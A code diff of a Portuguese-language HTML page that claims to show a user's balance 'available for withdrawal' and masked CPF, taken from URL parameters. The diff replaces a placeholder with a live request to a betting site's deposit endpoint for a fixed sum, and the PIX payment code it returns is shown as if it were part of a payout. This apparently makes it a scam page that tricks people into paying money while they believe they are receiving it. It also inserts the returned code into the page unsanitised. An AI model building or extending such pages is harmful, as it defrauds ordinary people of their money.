@@ -58,81 +58,71 @@
 </head>
 <body>
     <div class="container">
-        <!-- Nome do usuário -->
         <h1 id="user-name"></h1>
-
-        <!-- Informações do pagamento -->
         <div class="info">
             <p>Valor disponível para retirada: <span id="valor-disponivel"></span></p>
             <p>CPF do titular: <span id="cpf-titular"></span></p>
         </div>
-
-        <!-- Espaço reservado para o código PIX -->
         <div class="pix-placeholder" id="pix-placeholder">
             Aguarde, carregando código PIX...
         </div>
     </div>
 
     <script>
-        // Função para extrair parâmetros da URL
         function getParameterByName(name) {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get(name);
         }
 
-        // Função para formatar o CPF (borrando os 6 dígitos do meio)
         function formatarCPF(cpf) {
-            if (!cpf || cpf.length !== 11) return cpf; // Retorna o CPF original se não for válido
+            if (!cpf || cpf.length !== 11) return cpf;
             return `${cpf.slice(0, 3)}.***.***-${cpf.slice(-2)}`;
         }
 
-        // Recuperando os dados da URL
         const nome = getParameterByName('nome');
         const cpf = getParameterByName('cpf');
         const saldo = getParameterByName('saldo');
 
-        // Exibindo os dados na página
         if (nome && cpf && saldo) {
             document.getElementById('user-name').textContent = `Olá, ${nome}`;
             document.getElementById('valor-disponivel').textContent = `R$${parseFloat(saldo).toFixed(2).replace('.', ',')}`;
             document.getElementById('cpf-titular').textContent = formatarCPF(cpf);
         } else {
             alert("Dados inválidos. Por favor, retorne à página anterior.");
-            window.location.href = "https://sites.google.com/view/rendaganha/home"; // Redireciona para o site
+            window.location.href = "https://sites.google.com/view/rendaganha/home";
         }
 
-        // Espaço reservado para a requisição AJAX (código PIX)
-        function carregarCodigoPIX() {
-            // Aqui você pode implementar a requisição AJAX para buscar o código PIX
-            // Exemplo:
-            /*
-            fetch('https://sua-api.com/gerar-pix', {
-                method: 'POST',
-                body: JSON.stringify({ cpf, valor: saldo }),
-                headers: { 'Content-Type': 'application/json' }
-            })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('pix-placeholder').innerHTML = `
-                    <img src="${data.qrcode}" alt="Código PIX">
-                    <p>${data.codigoPix}</p>
-                `;
-            })
-            .catch(error => {
-                console.error('Erro ao carregar código PIX:', error);
-                document.getElementById('pix-placeholder').textContent = 'Erro ao carregar código PIX.';
-            });
-            */
+        async function carregarCodigoPIX() {
+            const url = "https://6n6bet.com/finance/third/deposit?t=1739533972414";
+            const data = "amount=297&third_id=2060&join_promo=2&choose_promo=";
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "accept": "*/*",
+                        "content-type": "application/x-www-form-urlencoded",
+                        "origin": "https://6n6bet.com",
+                        "user-agent": "Mozilla/5.0"
+                    },
+                    body: data
+                });
+
+                if (response.ok) {
+                    const result = await response.json();
+                    const codigoPix = result?.pix_code || "Código PIX não encontrado.";
+                    document.getElementById("pix-placeholder").innerHTML = `
+                        <p>Código PIX: ${codigoPix}</p>
+                    `;
+                } else {
+                    document.getElementById("pix-placeholder").textContent = "Erro na requisição: " + response.status;
+                }
+            } catch (error) {
+                document.getElementById("pix-placeholder").textContent = "Erro: " + error.message;
+            }
         }
 
-        // Simulando o carregamento do código PIX (substitua pela requisição AJAX real)
-        setTimeout(() => {
-            document.getElementById('pix-placeholder').innerHTML = `
-                <p>Código PIX: 123e4567-e89b-12d3-a456-426614174000</p>
-                <p>Ou escaneie o QR Code abaixo:</p>
-                <img src="https://via.placeholder.com/200" alt="QR Code PIX">
-            `;
-        }, 2000); // Simula um delay de 2 segundos
+        carregarCodigoPIX();
     </script>
 </body>
 </html>
